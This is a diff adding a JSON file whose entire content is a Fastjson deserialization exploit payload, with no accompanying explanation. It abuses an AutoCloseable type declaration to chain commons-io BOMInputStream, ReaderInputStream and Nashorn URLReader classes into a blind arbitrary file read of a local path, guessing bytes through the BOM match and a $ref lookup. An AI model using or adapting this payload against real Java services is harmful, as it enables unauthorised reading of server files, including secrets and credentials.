@@ -1,0 +1,22 @@
+{
+    "abc": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "org.apache.commons.io.input.BOMInputStream",
+        "delegate": {
+            "@type": "org.apache.commons.io.input.ReaderInputStream",
+            "reader": {
+                "@type": "jdk.nashorn.api.scripting.URLReader",
+                "url": "file:///D:/1.txt"
+            },
+            "charsetName": "UTF-8",
+            "bufferSize": 1024
+        },
+        "boms": [{
+            "charsetName": "UTF-8",
+            "bytes": [66]
+        }]
+    },
+    "address": {
+        "$ref": "$.abc.BOM"
+    }
+}
